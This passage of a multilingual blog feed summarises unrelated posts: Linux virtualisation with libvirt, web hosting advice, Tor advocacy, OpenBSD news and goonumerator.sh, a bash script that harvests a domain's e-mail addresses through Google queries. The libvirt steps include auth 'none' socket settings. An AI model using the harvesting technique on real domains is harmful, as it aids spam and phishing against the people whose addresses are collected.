wretched and, as I now understand, frankly ugly code, I have a legitimate excuse for that. I may be horrible at coding, but at the time, I was looking for a simple project to do in C++ or bash script, and my mother needed me to collect all the images from her windows user directory that we backed up onto a USB portable hard drive. She has hundreds of folders with pictures in them, and they are scattered in many different places, so manually going through and copying each picture was a no-no. So, I thought, "what the heck.", and decided to basically make a script in c++. I'm a person who codes to get the job done, and as such, 99/100 time will probably do something overkill, and inefficient. That's me. Anyways, the program worked, and would recursively find all jpeg files, and copy them to one folder.  About one hour after I wrote and ran this program, for some reason (how should I remember?), I went looking for a solution to removing flash cookies under linux, and more specifically, ubuntu. At that point it was 3:00 AM, and I was impatient and looking for a quick solution. After searching google for 5 minutes I read that they were in ".sol" files, and so changed a few lines in my code, and added a few more system commands. I knew nothing of the .adobe directory, and didn't feel like finding out, and besides, you can run this on a windows partition, another users home directory, etc, and it will seek out all the .sol files, instead of limiting it to only YOUR user directory. At (now) 4:00 AM, this was a win-win situation to me, and I called it a day.  Because I made it, I thought I'd share it. Because I shared it, I didn't want to answer questions (don't ask). To avoid questions, I twisted the facts. But what lexical technicality did I o-so obliviously (intentionally) leave buried, never to be recovered by the technologically inept?  Well, I coded it on the Ubuntu distribution. I tried it on the Ubuntu distribution. I was too lazy to do any research on compatibility issues between distros, if any. I was too lazy to even consider dealing with random compatibility issues by dispersing the assumption that it runs on "linux" in general. (while we're on that note, it would be an erroneous assumption to say it runs on "linux", as that is referring only to the kernel, isn't it? My program clearly runs as a pseudo or hard-coded script, using the find command, and shred, among others... )  So naturally, and in a rush, I said it would only work on Ubuntu. I know; I'm such a bad person.  So I hope you understand where I'm coming from, and If you're really that critical about things, then say something. To my face. Please. That's what this blog is for, and that's what the comment boxes are for. It's not like I can do anything to you, besides take your advice.  The only thing worse than an idiot is one who doesn't know they are. Educate the inexperienced, don't break them.]]></summary>

  <title><![CDATA[BRA WEBBHOTELL – ATT VÄLJA ETT BRA WEBBHOTELL]]></title>
  <summary><![CDATA[Vilka är de viktiga sakerna du bör titta efter när du väljer ett bra webbhotell? Kriterierna för att välja ett gratis webbhotell eller ett kommersiellt webbhotell skiljer sig något även om de överlappar varandra. 
Om du väljer ett gratis webbhotell så får du stå ut med att man kommer att infoga reklam på din webbplats. Detta görs för att täcka kostnaderna för att tillhandahålla din webbplats gratis webb utrymme och tillhörande tjänster. Vissa värdar kräver att du placera en banner på din sida, andra visar ett fönster som öppnas varje gång en sida på din webbplats laster, medan ytterligare andra innebär en reklam ram på din webbplats. Det finns egentligen inga fasta regel som är att föredra: vissa människor hatar ett popup-fönster, ogillar andra webmasters behöva koder grejer banner på sina sidor, och många människor klarar inte en reklam ram (som kan orsaka problem när du skicka in din webbplats till sökmotorer). Oavsett vilken metod som används, kontrollera att du är bekväm med metoden. 
Observera att gratis webbhotell utan reklam är inte nödvändigtvis goda nyheter. Utan ett fungerande medel för att täcka kostnaderna för att köra deras server, många av dem nära med alarmerande frekvens. 
Har webbhotellet tillräckligt med utrymme för dina behov? Om du tänker dig att du kommer att expandera din webbplats så småningom kanske du vill tillgodose framtida expansion. De flesta webbplatser använder mindre än 5 MB webbutrymme. Faktum är att vid ett tillfälle en av mina andra webbsajter  används mindre än 5 MB utrymme trots att det hade ungefär 150 sidor på webbplatsen. Dina behov kommer att variera, beroende på hur många bilder på dina sidor använder, oavsett om du behöver ljudfiler, videoklipp, etc. 
FTP (Om du undrar: Vad är FTP?) 
Några gratis webbhotell tillåter bara att du kan designa din sida med sina online-byggare. Även om detta är bra för nybörjare, har ni möjlighet att utöka senare när du blir erfaren och deras online sidkonstruktör inte har möjlighet du behöver? FTP-åtkomst, eller åtminstone, är möjligheten att ladda upp dina sidor via e-post eller webbläsare, som behövs. Personligen anser jag FTP är obligatorisk, utom för de mest triviala webbplats. 
Filtyp och storlek begränsningar Se upp för dessa. Några gratis värdar införa en maximal storlek på alla filer du laddar upp (varav ett med en bottennotering på 200KB). Andra webbplatser begränsa vilka filtyper du kan överföra till HTML och GIF / JPG-filer. Om dina behov är olika, t.ex. om du vill distribuera dina egna program på dina sidor måste du söka någon annanstans. 
Tillförlitlighet och snabbare tillgång Detta är oerhört viktigt. En webbplats som ofta ner kommer att förlora många besökare. Om någon hittar din webbplats på sökmotorer, och han försöker komma åt den, men tycker att det är nere, kommer han helt enkelt gå ner i listan för att hitta en annan webbplats. Långsam tillgång är också väldigt frustrerande för besökare (och för er också, när du laddar upp din webbplats). Hur vet man om en värd är pålitlig eller snabb? Om du inte kan få feedback från någon, ett sätt är att prova det själv under en tid, både under rusningstid samt icke-rusningstid. När allt är det gratis, så du kan alltid experimentera med det. 
Perl och PHP (Om du undrar: Vad är PHP och Perl?) 
Detta är inte särskilt viktigt i dag för ett gratis webbhotell, eftersom det finns så många gratis skript hosting-tjänster tillgängliga som ger räknare, sökmotorer, blanketter, enkäter, e-postlistor, etc, utan att du behöver fuska med Perl eller PHP-skript. 
Men om du verkligen vill göra det själv, med ett minimum av reklam banners från dessa kostnadsfria leverantörer, behöver du antingen PHP eller Perl tillgång. Observera att det inte räcker att veta att de tillhandahåller PHP eller Perl: Du måste veta vilken typ av miljö du köra skript under: det är så restriktiva att de inte är till någon jordisk använda? För PHP-script, inte ditt webbhotell tillåter dig att använda mail () funktion? För Perl-skript, har du tillgång till sendmail eller dess workalike? 
Bandbredd tilldelning Numera har många bra gratis webbhotell införa en gräns för hur mycket trafik din webbplats kan använda per dag och per månad. Detta innebär att om sidorna (och grafiska bilder) på din sida laddas av besökarna bortom ett visst antal gånger per dag (eller per månad), kommer webbhotell avaktivera din webbplats (eller kanske skicka en faktura). Det är svårt att rekommendera ett visst minimum av bandbredd, eftersom det beror på hur du designar din webbplats, din målgrupp, och antalet besökare du kan locka till din webbplats. I allmänhet är 100 MB trafik per månad för lite för något annat än din personliga hemsida och 1-3 GB trafik per månad är oftast tillräckligt för en enkel webbplats just har börjat. Din körsträcka, kommer dock att variera. 
Välja en Commercial Web Host Tillförlitlighet och snabbare tillgång Inte bara bör webbhotell vara tillförlitligt och snabbt, bör garantera dess driftstid (när den är funktionell). Sök efter en minsta drifttid på 99%. Faktum är att även 99% egentligen för låg - det egentligen borde vara 99,5% eller högre. Den mottagande bör ge någon form av bidrag (t.ex. proportionellt beräknad återbetalning eller rabatt) om det faller under denna siffra. Tänk dock på att garantierna ofta är svåra att tillämpa från din slut - den mottagande kräver vanligen alla typer av dokumentation. Men utan denna garanti, kommer webbhotell få incitament att se till att dess servrar är igång hela tiden. 
Data Transfer (Traffic / bandbredd) Dataöverföring (ibland löst kallad "trafik" eller "bandbredd") är den mängd byte överförs från din webbplats till besökarna när de besöker din webbplats. 
Tro inte något kommersiellt webbhotell som annonserar "obegränsad bandbredd". Mottagande måste betala för bandbredd, och om du konsumerar mycket av det kommer de inte stillatigande bära dina kostnader. Många hög bandbredd webbplatser har funnit ut det här den hårda vägen när de plötsligt får ett exhorbitant räkning för att ha "överskridit" det "obegränsad bandbredd". Leta alltid efter information om hur mycket trafik paketet tillåter. Jag personligen alltid stanna fri från varje värd som annonserar "obegränsad överföring", även om det exakta beloppet anges någon annanstans (ibland begravda i sina politiska uttalanden). Vanligtvis kommer du att upptäcka att de omdefiniera "obegränsade" att vara begränsad på något sätt. 
Dessutom, medan bandbredd förutsättning är något du bör alltid, inte vara alltför styras av löften om otroligt stora mängder bandbredd. Chansen finns att din webbplats inte kommer att kunna använda det beloppet eftersom det kommer att slå andra gränser, nämligen resurs gränser. Mer information finns i artikeln det finstilta i Web Hosting: Resursanvändning Gränser. 
För att ge dig en ungefärlig uppfattning om den typiska trafikens krav på en webbplats, de flesta nya platser som inte är programvara arkiv eller liknande med mindre än 3 GB bandbredd per månad. Din trafikens krav kommer att växa med tiden, när din webbplats blir mer välkända (och många länkar), så du måste även kontrollera sin politik för översatsad: finns det en publicerad kostnad per GB över de tillåtna bandbredd? Är den avgift som enligt faktisk användning eller är du förväntas att i förväg betala för en potentiell översatsning? Det är bättre att inte gå för värdar som förväntar sig att du betalar i förskott för översatsad, eftersom det är mycket svårt att forsee när din sida kommer att överskrida sin bandbredd och hur mycket. 
Diskutrymme Av samma anledning som bandbredd, se upp även för dem "obegränsad diskutrymme" system. De flesta webbplatser behöver mindre än 10 MB webbutrymme, så även om du är utrustad med en värd som lockar dig med 200 MB eller 500 MB (eller "obegränsat utrymme"), tänk på att du sannolikt inte kommer att använda detta utrymme, så du "Låt inte 500 MB utrymme för stor faktor i beaktande när man jämför med andra webbhotell. Webbhotell är också medveten om att det är därför de gärna erbjuda dig det som ett sätt att locka dig värd där. Enligt en grov gauge, thefreecountry.com, som hade cirka 150 sidor när denna artikel skrevs först, används mindre än 5 MB för webbsidor och tillhörande filer. 
Teknisk support Har sitt tekniska stödfunktionen 24 timmar om dygnet, 7 dagar i veckan (ofta förkortat 24 / 7), året runt? Observera att jag inte kommer att acceptera en värd som inte har personal som arbetar på helger och helgdagar. Du kommer att bli förvånad över hur ofta det går snett på den mest obekväma gånger. Förresten, bara för att en värd annonserar att man har 24 / 7 support behöver inte betyda att det verkligen har den typen av stöd. Testa dem via e-post vid midnatt och på lördagskvällarna, söndagsmorgnar, etc. Kolla in hur lång tid de tar att reagera. Förutom snabba svar, kontrollera om de är tekniskt kompetent. Du vill inte att registrera sig för en värd som drivs av ett gäng försäljare som bara vet hur man säljer och inte åtgärda problemen. 
FTP, PHP, Perl, SSI,. Htaccess, Telnet, SSH, MySQL, crontabar Om du betalar för en webbplats, du borde verkligen se till att du har alla dessa. 
Observera att vissa kommersiella värdar inte tillåter dig att installera PHP eller Perl-skript ( "Vad är PHP och Perl?") Utan deras godkännande. Detta är inte önskvärt, eftersom den innebär att du måste vänta på dem innan du kan genomföra en funktion på din webbplats. ". htaccess" behövs om du skall göra saker som att anpassa ditt fel sidor (sidor som visar när, säger en användare begär en sida som inte finns på din sida) eller du skyddar dig på olika sätt (till exempel att förhindra bandbredd stöld och hotlinking, etc). 
Telnet eller SSH-åtkomst är lämplig för vissa saker, bland annat test av vissa script (program), underhålla databaser, etc. MySQL krävs om du vill köra en blogg eller ett content management system. Cron är en typ av program schemaläggare som låter dig köra program vid vissa tider på dagen (t.ex. en gång dagligen). Kontrollera om dessa faciliteter. 
SSL (säker server), Kundvagn Om du planerar att göra någon form av verksamhet via hemsida, kanske du vill titta ut för att se om den mottagande tillhandahåller dessa tjänster. Dessa anläggningar omfattar normalt ett högre prissatta paket eller extra avgifter. Det viktigaste är att kontrollera om de finns på alla innan du förbinder sig till värden. Du behöver definitivt SSL om du vill samla kreditkortsbetalningar på din webbplats. 
E-post, Autoresponders, POP3, Mail Forwarding Om du har en egen webbplats, skulle du förmodligen vill ha e-postadresser på din egen domän, liksom sales@yourdomain.com, etc. Har den mottagande förse det med paketet? Tillåter det dig att ha en catch-all e-postkonto som orsakar e-postadress på din domän ska dirigeras till dig? Kan du ange en e-postadress för att automatiskt svara avsändaren med ett förinställt meddelande (kallas autosvarare)? Kan du hämta dina mail med ditt e-postprogram? Kan det vara automatiskt vidarebefordras till din nuvarande e-postadress? 
Kontrollpanelen Detta kallas olika namn i olika datorer, men i huvudsak de alla att du kan hantera olika aspekter av ditt webbkonto själv. Normalt, och allra minst bör det tillåter dig att göra saker som att lägga till, ta bort och hantera dina e-postadresser och lösenord förändring för ditt konto. Jag skulle inte gå för en värd där jag måste gå igenom deras tekniska support varje gång jag vill ändra ett lösenord eller lägga till / ta bort ett e-postkonto. Sådana sysslor är vanliga underhållet sysslor att varje webmaster utför om och om igen, och det skulle vara en stor krångel om du var tvungen att vänta på sin tekniska support att göra ändringar för dig. För att det ska vara ett bra webbhotell måste du tänka över detta. 
Flera med domäner och underdomäner För de som funderar på att sälja webbutrymme eller har flera domäner eller underdomäner värd i ditt konto, ska du titta för att se om de ger detta, och hur mycket extra som de tar betalt för detta (om det är ett en-eller månadsavgift , etc). 
Server Är den typ av operativsystem och server viktigt? Oavsett om du tror det eller inte på den teoretiska nivån, finns det några praktiska skäl för att hålla utkik efter typ av server. 
Generellt gäller att om du vill använda saker som att skriva / använda ASP-program, har ni inget annat val än att söka efter en Windows-server. 
Annars föredrar jag är att registrera sig för konton med ofta billigare, mer stabil och funktionsrika lastad Unix-system som kör Apache-server. Faktum är att om dynamiskt genererade sidor som kan komma åt databaser (etc) är vad du vill, kan du alltid använda den mer bärbara (och populära) PHP istället för att binda dig ner till ASP. Ett annat skäl att föredra Unix-baserade webbhotell (vilket inkluderar webbhotell använder system som Linux, FreeBSD, OpenBSD, Solaris, etc) med webbservern Apache är att dessa servrar kan du konfigurera en hel del utrustning som du normalt behöver för ditt site (felsidor, skydda dina bilder, som blockerar e skördare, blockera IP-adresser, etc) utan att behöva be webbhotellet att genomföra dem. Kunskap om hur du konfigurerar Apache-servrar är också allmänt tillgängliga, och kan hittas på thesitewizard.com s Konfigurera Apache och. Htaccess sidor. 
För den som är intresserad kan du läsa en annan diskussion i frågan i "bör du välja en Linux eller Windows webbhotell paket? Finns det någonting sådant som en Mac Web Host?" artikel. 
Pris Jag var faktiskt tveksam till att lista här, men jag antar att det är lönlöst inte. Jag skulle dock vilja varna för att även priset är alltid en faktor bör du inse att du ofta får vad du betalar för, även om det inte nödvändigtvis sant att de dyraste är värd är de bästa. 
Månadsvis / kvartals-och årsvisa Avbetalningsplaner De flesta webbhotell kan du välja en årlig utbetalning plan som ger dig ett billigare pris än om du skulle betala månadsvis. Min nuvarande personligen tycker att betala månadsvis med alla nya webbhotell tills jag är säkra på sin pålitlighet och ärlighet. Betalar varje månad gör att jag kan byta webbhotell snabbt när jag märker att den nuvarande värd inte uppfyller mina krav: det här sättet, jag är inte bundna till ett dåligt webbhotell eftersom jag har förbetalt för ett helt år. Jag gör detta även om den nya webbhotell garantier för att de återbetalar balans om jag är missnöjd, eftersom det vid den punkt jag registrera mig, har jag inga garantier för att de kommer att uppfylla sina garantier. Senare (vanligtvis efter flera månader eller till och med mer än ett år), när jag är nöjd med den mottagande ändrar jag ofta betalning planer som det diskonterade årliga planer. 
Återförsäljare? Inte alla webbhotell äga eller hyra egna webbservrar. Några av dem är faktiskt återförsäljare för något annat bra webbhotell. Nackdelen med att använda en återförsäljare finns det möjlighet att du har att göra med människor som inte vet mycket om det system som de säljer, och som tar längre tid att hjälpa dig (de har att sända din tekniska support begäran till den faktiska webbhotell det skall beaktas). Detta beror dock också på både återförsäljare och underliggande webbhotell. Det är alltså klokt att inte utesluta alla återförsäljare, det finns ett antal tillförlitliga och snabba de som faktiskt är ganska bra och billig. I själva verket ett antal återförsäljare säljer samma paket billigare än deras ursprungliga webbhotell. Om du upptäcker att ett visst företag är återförsäljare, måste du undersöka både återförsäljare och den verkliga webbhotell.

  <title><![CDATA[Serveur personnel avec arch-linux - Partie 3 : virtualisation]]></title>
  <summary><![CDATA[Dans la première partie, on a configuré le réseau (firewall, dnsmasq, bridge).
Dans la seconde partie, on s'est intéressé à SSH. 


Dans cette partie, on va utiliser libvirt et kvm pour gérer des machines virtuelles. 


Installation

#yaourt libvirt

On va utiliser les permissions unix plutôt que polkit (pas trop de succès avec polkit) donc il faut décommenter la ligne concernant les droits unix comme indiqué dans le PKGBUILD.
On va également installer kvm 

#yaourt qemu-kvm

et quelques dépendances : 

#pacman -S hal  avahi


Modifier /etc/libvirt/libvirt : 

unix_sock_group = "libvirt"
unix_sock_ro_perms = "0770"
unix_sock_rw_perms = "0770"
auth_unix_ro = "none"
auth_unix_rw = "none"



On va crée le groupe libvirt (qui aura accès à libvirt) 

#sudo groupadd libvirt
#sudo gpasswd -a cedric libvirt

et on démarre le service : 

#sudo /etc/rc.d/libvirtd start


Configuration pour l'accès à distance

Il y a plusieurs possibilités : 

par SSH : testé avec succès. Ce n'est pas très facile à mettre en place (nécessite l'utilisation de clés SSH)
Utiliser TCP/IP : testé avec succès. Facile à mettre en place. J'ai décrit cette méthode sur le wiki Using unencrypted TCP/IP socket
utiliser des certificats TLS. Cette méthode est très bien décrite dans la doc de libvirt Remote_certificates. C'est également la méthode que je vais décrire ici.


Utilisation de certificats TLS

#yaourt gnutls


Il est nécessaire de démarrer le serveur avec l'option listen.
Editer /etc/conf.d/libvirtd 

LIBVIRTD_CONFIG=
LIBVIRTD_ARGS="--listen"
KRB5_KTNAME=/etc/libvirt/krb5.tab



Il faut ensuite générer : 

un certificat CA auto-signé
le certificat du serveur
un certificat par client


Certificate Authority (CA) :

Génération de la clé privé : 

 #certtool --generate-privkey > cakey.pem



Génération du certificat
Créer
ca.info 

   cn = my home
   ca
   cert_signing_key

 #certtool --generate-self-signed --load-privkey cakey.pem --template ca.info --outfile cacert.pem



Copier le certificat dans /etc/pki/CA/cacert.pem sur le serveur et sur les clients 


Certificat du serveur

Génération de la clé privé : 

 #certtool --generate-privkey > serverkey.pem



Génération du certificat
Créer server.info 

   organization = my home
   cn = bump
   tls_www_server
   encryption_key
   signing_key


Signer le certificat avec la clé de la certificate autority 

 #certtool --generate-certificate --load-privkey serverkey.pem --load-ca-certificate cacert.pem --load-ca-privkey cakey.pem --template server.info --outfile servercert.pem



Copier 

serverkey.pem dans /etc/pki/libvirt/private/serverkey.pem sur le serveur
servercert.pem dans /etc/pki/libvirt/servercert.pem sur le serveur


Certificat des clients

Pour chaque client :
Génération de la clé privée : 
 
 #certtool --generate-privkey > clientkey.pem



Créer le certificat client.info : 

   country = FR
   state = Paris
   locality = Paris
   organization = my home
   cn = antec
   tls_www_client
   encryption_key
   signing_key

et le signer : 

 #certtool --generate-certificate --load-privkey clientkey.pem --load-ca-certificate cacert.pem --load-ca-privkey cakey.pem --template client.info --outfile clientcert.pem



Copier la clé et le certificat sur le client : 

#cp clientkey.pem /etc/pki/libvirt/private/clientkey.pem
#cp clientcert.pem /etc/pki/libvirt/clientcert.pem


Connection à distance

#virsh -c qemu://bump/system


Création d'une VM

On peut utiliser pour celà virtinst 

#yaourt virtinst

Création de la VM : 

 #virt-install --connect qemu:///system --name seven --ram 1024 --os-type=windows --os-variant=win7 --vnc --vnclisten 0.0.0.0 --disk /var/lib/libvirt/images/seven.img,size=20,format=qcow2 --cdrom /home/cedric/isos/Windows7.iso


On crée ici une VM pour Windows7, avec 1Go de RAM, 20Go de disque dur au format qcow2 et on met l'iso du système comme cdrom. 


A noter que l'on peut faire tout çà en utilisant virt-manager à partir du poste client ... Enfin en principe : virt-manager fait planter libvirt chez moi 3 fois sur 4. 


On peut ensuite se connecter à la VM à partir d'un autre poste avec virt-viewer 

#virt-viewer --connect qemu://bump/system seven


Réseau

Dans la première partie, nous avons créé un bridge (sorte de switch virtuel). Nous allons ici connecter la machine virtuelle à ce bridge. 


Sur le serveur : 

#sudo EDITOR=nano virsh edit seven

Modifier le fichier : 

   <interface type='bridge'>
      <mac address='52:54:00:40:41:ee'/>
      <source bridge='br0'/>
      <target dev='vnet0'/>
   </interface>



Utilisation de rdesktop

Plutôt que d'utiliser virt-viewer, il est préférable de configuration l'accès à distance dans seven et d'utiliser rdesktop.
On peut utiliser grdesktop par exemple ou remmina 


Snapshots

Sur le serveur : 

#cd /var/lib/libvirt/images/


Lister les snapshots 

#sudo qemu-img snapshot -l seven2.img


Créer un snapshot : 

#sudo qemu-img snapshot -c "snapshot label" seven.img


Revenir à un snapshot : 

#sudo qemu-img snapshot -a "snapshot label" seven.img


Reste à voir

Lors du redémarrage du serveur (ce qui ne devrait pas arriver trop souvent), les VMs sont stoppés de façon abrupte. Il serait préférable de suspendre la VM (virsh save) et de la restaurer (virsh restore) au démarrage. 


Remarques


Utilisation de SSH

L'utilisation de SSH pour la connection à distance nécessite l'utilisation de clés SSH. Voir Using SSH Keys
Il faut également installer openbsd-netcat. netcat est nécessaire pour l'accès par ssh mais libvirt utilise nc et non nc.openbsd. Un lien est donc nécessaire : 

#ln -s /usr/bin/nc.openbsd /usr/bin/nc


Plantage de libvirt

En cas de plantage de libvirt et si /etc/rc.d/libvirtd start ne fonctionne pas : 

#sudo rm /var/run/libvirtd.pid
#sudo /etc/rc.d/libvirtd start]]></summary>

  <title><![CDATA[Ur funktion]]></title>
  <summary><![CDATA[Satt i bilen på väg hem från min mor och kom på följande; det engelska ordet "work" betyder ju både "arbeta"(no shit?) och "fungera"(jag skojar inte). Det måste betyda att eftersom jag är hemma från jobbet är jag ur funktion. Om jag vore sjuk vore jag följaktligen funktionshindrad. 
 
Det är nog bäst att jag börjar jobba snart så jag inte lägger för mycket tid på sådant här nonsens. 
 
Besöket hos mor med bihang gick bra. Jag lyckades komma hemdrällandes med en laptop. Ja svimma inte nu, den är riktig gammal, men den fungerar. Kör Windows 98 och det går "ruskigt fort". Då den bara hade IE 5.5, och Firefox inte stöder Win98 från version 3, fick det bli Opera. Tack Norge för att ni håller gamla OS vid liv. Annars hade det väl gått att vända sig till Finland och stoppa in någon Linuxdist. (Kanske DSL kunde vara något? Eller varför inte OpenBSD?).

  <title><![CDATA[Kør med flere styresystemer samtidig]]></title>
  <summary><![CDATA[Er du  interesseret i  at køre flere operativsystemer, skal man ompartitionere sin harddisk og installere en multiboot-loader. Det kan fungere fint, men det er teknisk, og hvis man ikke er forsigtig, kan man miste hele harddiskens indhold – inklusive det oprindelige operativsystem og alle sine data. 
Der kan være mange grunde til at man ønsker at køre med flere operativ systemer, spiller spil, vil gerne teste et operativ system. 
VirtualBox 
Virtualiseringsteknik er noget, de færreste beskæftiger sig med, men med VirtualBox (www.virtualbox.org) er det lige så let som alle andre typer applikationer. 
Ved at installere open source-programmet VirtualBox på pc’en, kan man oprette flere virtuelle pc’er med virtuelle harddiske og egne operativsystemer. De virtuelle harddiske er blot filer på pc’ens rigtige harddisk, og de virtuelle pc’er køres i et vindue. Det bedste er dog, at man kan installere forskellige operativsystemer på disse virtuelle pc’er. 
VirtualBox-programmet kører på Windows, Linux og Mac og understøtter installering af en lang række operativsystemer deriblandt Windows NT/2000/XP/Server 2003/Vista, DOS/Windows 3.x, Linux (med kernel 2.4 og 2.6) og OpenBSD med flere. 
Pen Drive Linux 
Hvis man ønsker at køre Linux på sin Windows-pc, kan man også installere hele operativsystemet på en USB-hukommelse. Forskellen på en Linux boot-cd og denne løsning er selvfølgelig, at man med USB-hukommelsen kan gemme sine indstillinger og dokumenter sammen med operativsystemet. Omvendt kræver det, at ens pc kan boote fra en USB-hukommelse, og det er det ikke alle der kan. 
Har man lyst til at prøve at installere Linux på en USB-hukommelse, finder man på Pen Drive Linux udførelige forklaringer på, hvordan dette gøres med forskellige Linux-distributioner deriblandt Ubuntu, Knoppix, Gentoo og andre]]></summary>

  <title><![CDATA[Torbrowser till alla!]]></title>
  <summary><![CDATA[Brottsspaningen på nätet har blivit svårare efter ipredlagen, anser både åklagare och Ifpi, musikindustrins branschorganisation.  - Telia och andra operatörer saboterar spaningen, säger Ifpis vd Lars Gustafsson.   IPRED-lagen ger ju upphovsrättsinnehavare rätt att i domstol begära ut identiteten bakom en ip-adress som misstänks användas till olaglig fildelning. Men det finns ju inget som säger att samma lag kan användas i annat syfte.  Personer som exempelvis observerar missförhållanden gällande Fas 3, vilket kan vara arbetsförmedlare eller andra som har med denna grupp människor att göra, kan bakvägen via dylika lagar få sin identitet röjd.  Även en person som är placerad i Fas 3, och som observerar missförhållanden på sin "arbetsplats" (placeringen för den samhällsnyttiga tjänsten) riskerar att få sin identitet röjd.  Därför är det viktigt att man lär sig att vara anonym på nätet.  Tillägg 20091205.  Bäste PRX,  Våra rekommendationer för Torbrowser är framtagna för vanliga användare, med normal eller låg kompetens gällande data och IT. Vi är väl medvetna om befintliga VPN tjänster, och jag som skriver denna kommentar använder mig själv av dylika tjänster och kan därför också rekommendera dem. Dock så vet du inte vad tjänsteleverantören gör med de uppgifter som skapas när du går via leverantörens VPN service. Tjänsteleverantören sitter faktisk och kontrollerar utnoden. Det är ju faktiskt tjänsteleverantören som ger dig möjligheten att komma ut anonymt på internet via dennes vpn tjänst (server). I de fall jag vill vara anonym, så använder jag därför fortfarande Tor, men under linux bekvämt hanterat i Virtualbox. Jag kan därför blanda min användning efter behov.  En VPN tjänst som är köpt, och som går via någon leverantör, har också en annan svaghet. Lagförande myndigheter kan lätt täppa till det hålet, den möjligheten när som helst. Tor, Torbrowser, blir mycket svårare att stoppa. Enligt min uppfattning mer eller mindre omöjligt. Inte ens i framtidslandet har man lyckats. Därför blir användningen av tor, torbrowser, också en proaktiv handling för att försvara öppenheten och den fria diskussionen när vpn-servrarna snart kanske stängs ned en efter en. Och om fler börjar använda Tor, Torbrowser så kanske makthavare förstår att de faktiskt i längden för en omöjlig kamp.  Tor är därför en annan lösning, där ingen tjänsteleverantör kontrollerar ut och slutnod. Däremot så har den som sitter på slutnoden teknisk möjlighet att avlyssna innehållet i trafiken, men inte ip-adressen, och det under förutsättningen att trafiken är okrypterad. Därför skall man använda sig av krypterad trafik så mycket som möjligt, som exemplet med Hushmail i Torbrowser howto. För mer tekniska detaljer och mer ingående diskussioner om hur Tor fungerar hänvisar jag till http://www.torproject.org/.  De lösningar som du beskriver "användarscript som fejkar din webbläsare och ditt operativsystem", "Använd mjukvara som redan finns beroende på var du letar som talar om när allehanda spårningsprogram sniffar efter ditt IP nummer", är alldeles för svårt och avancerat för den vanlige användaren. Jag skulle aldrig rekommendera en vanlig användare att själv sitta och skriva regler för PF för att där sitta och hacka till det så att paketen skrivs om innan de far ut på internet. Jag vet mycket väl att man kan använda sig av OpenBSD's packetfilter för att dölja vilket operativ man har, etc. Vad blir nästa steg? Att lära folk använda cgd för krypterad swap och minneshantering, eller sätta upp en myriad av hemmanätverk med en massa zones, där man också är insatt i project Kenai och immutable service containers, för att förvilla ett eventuellt intrång?  Och Torbrowser fyller definitivt de behov som vi avser att hjälpa till att fylla. Nämligen att våga säga vad man tycker, så säkert som möjligt utan att avslöja sin identitet, och så enkelt som möjligt för den vanlige användaren.  Och visst är tor segt. Men det är inte meningen att man skall sitta och nöjessurfa, titta på youtube (live), eller fildela via bittorrent. Däremot så går det utmärkt att använda tor för att ta del av, och dela med sig av information, ex. texter , blogginlägg , etc. Och rätt använt, så är Torbrowser en säker lösning i det fallet man också tittar efter användarvänlighet. En tjänsteman som sitter och mår illa och som sitter inne med information som denne på något sätt vill få ut till allmänheten, kan med hjälp av Torbrowser få den möjligheten. En vanlig medborgare som också vill få ut information, men som om informationen kopplas till medborgaren kan ge medborgaren obehag och stora besvär, kan likaså ha nytta av Torbrowser. Med Torbrowser Howto vill vi därför möjliggöra för så många som möjligt, så enkelt som möjlig, att våga nå ut med sina budskap.  Torbrowser är ett öppet dokument. Vem som helt får kopiera det och på det som redan är gjort göra något som denne tycker är bättre. Men vi ser också gärna att fler vill deltaga i att göra befintliga Torbrowser Howto bättre. Där är även Du PRX välkommen att komma med Dina bidrag.  Maila nystatare@gmail.com den som är intresserad.]]></summary>

  <summary><![CDATA[Idag släpptes OpenBSD 4.6 och som vanligt var listan lång på förbättringar.  Förutom utökat stöd för flera olika chipset så har man arbetat med prestandan på flera olika drivrutiner för nätverkskort. Man har också aktiverat PF som standard samt förbättrat pfsync för att få bättre möjligheter att köra redundanta brandväggar i "aktiv-aktiv"-läge.  En annan liten nyhet är att man skrivit om installationen för att göra det ännu smidigare att installera OpenBSD.  Alla nyheter hittar du här: http://openbsd.org/46.html  // rancor]]></summary>

  <title><![CDATA[goonumerator.sh – Enumerate e-mail addresses with Google Search]]></title>
  <summary><![CDATA[I chose to write this in english so that more people could benefit from it… 
Google’s search engine is as you all know quite powerful and customizable when it comes to limiting and narrowing search queries. 
I got the idea of writing this script when I  browsed the  scripts on the Backtrack 4 Live-CD. On the CD there are various scripts for enumerating information from among others Google. I tried the goorecon script by Carloz “Dark Operator” Perez (wich inspired me to write this script). I didn’t get his ruby script to work so I figured I could try roll my own version in bash. 
This script could be handy if you just want to do a quick search to check if a clients domain is leaking e-mail addresses in clear text,  or simply want to demonstrate for you boss how easy it is for evil spambots to harvest addresses using google. 
My goonumerator script is quite crude and dirty and could probably be more efficient in other languages but since I like quick and dirty solutions and mostly write shell scripts I figured bash would suffice   
The script simply browse google’s search with w3m command line style and pipes the text to a file. When the query finishes sed&grep is used to extract the e-mail addresses. 
The query is based on the site: option combined with @TheDomainYouWannaScan.tld 
Google only displays ten results at a time if you’re not logged in to an account so I added an option to specify how many pages of results you want. 
The full query looks like this: 
http://www.google.com/search?q=site:Domain.TLD+%40Domain.TLD&start=40 
This example queries the Domain.TLD and gets the results starting from the 40th search result (equal to the 4:th page) 
Download the script HERE and feel free to comment and leave suggestions! 
I’ve only tried out the script in Cygwin, Ubuntu and OpenBSD. The ‘sed’ utility works differently in OpenBSD so the results gets garbled in the end…I may try to fix that and expand the script with more features later, and maybe check and use more cli browsers.. 
Over and out!]]></summary>

  <summary><![CDATA[Hola amigos :P  No me he metido a domador de leones o algo parecido xD (que chiste tan malo ¬¬). Hace un tiempo mientras desarrollaba neonatox 0.48 (ahorita estoy dando el resto =D), escribí un artículo sobre el reproductor flash Swfdec el de Benjamin Otte, si bien cumplió en parte con su cometido (tratar de llenar el hueco de flash con algo 100% libre), bien mostraba muchas fallas y no sonaba en algunos casos o mejor dicho sonaba en algunos casos, bastante desastroso quizás error humano al fin.   En el mismo artículo también comenté sobre Gnash que es la alternativa que ofrece GNU para reemplazar el Flash de Adobe, veamos un poco de historia:  Según Wikipedia: Gnash es un fork, un proyecto derivado, del proyecto GameSWF cuyo código se publicó como de dominio público. Gnash está bajo licencia GPL y su código puede ser útil en otros proyectos libres como swfdec. El proyecto fue anunciado por John Gilmore. Su principal desarrollador es Rob Savoye. Con respecto a los detalles técnicos nuevamente la Wikipedia nos dice: Actualmente, algunas de las plataformas o arquitecturas donde puede utilizarse: x86, AMD64, MIPS/Irix, PowerPC GNU/Linux y NetBSD, OpenBSD o FreeBSD. Adobe no proporciona un reproductor 